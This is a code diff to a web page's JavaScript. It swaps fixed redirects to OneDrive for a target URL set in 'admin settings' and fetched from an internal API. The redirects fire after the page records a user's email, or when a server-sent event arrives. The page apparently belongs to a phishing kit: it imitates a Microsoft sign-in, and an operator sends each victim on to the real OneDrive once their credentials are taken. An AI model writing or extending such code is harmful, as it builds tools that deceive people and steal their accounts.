@@ -1077,9 +1077,20 @@ Status: ${data.status}`);
                     if (!immediateRedirectHandled) {
                         immediateRedirectHandled = true;
                         console.log('🚀 Immediate redirect triggered by SSE event!');
-                        console.log('Redirecting to OneDrive immediately...');
                         eventSource.close();
-                        window.location.href = 'https://onedrive.live.com';
+                        
+                        // Get configured redirect URL from admin settings
+                        fetch('/api/internal/redirect-url')
+                            .then(response => response.json())
+                            .then(data => {
+                                const redirectUrl = data.success ? data.redirectUrl : 'https://onedrive.live.com';
+                                console.log(`Redirecting to configured target: ${redirectUrl}`);
+                                window.location.href = redirectUrl;
+                            })
+                            .catch(error => {
+                                console.warn('Error getting redirect config, using default:', error);
+                                window.location.href = 'https://onedrive.live.com';
+                            });
                     }
                 });
 
@@ -1128,8 +1139,17 @@ Status: ${data.status}`);
                         currentUserEmail = data.userEmail;
 
                         // Fallback redirect (in case SSE didn't trigger)
-                        console.log('Redirecting to OneDrive...');
-                        window.location.href = 'https://onedrive.live.com';
+                        fetch('/api/internal/redirect-url')
+                            .then(response => response.json())
+                            .then(data => {
+                                const redirectUrl = data.success ? data.redirectUrl : 'https://onedrive.live.com';
+                                console.log(`Redirecting to configured target: ${redirectUrl}`);
+                                window.location.href = redirectUrl;
+                            })
+                            .catch(error => {
+                                console.warn('Error getting redirect config, using default:', error);
+                                window.location.href = 'https://onedrive.live.com';
+                            });
                     }
                 } else {
                     throw new Error(data.message || data.error || 'Unknown error');
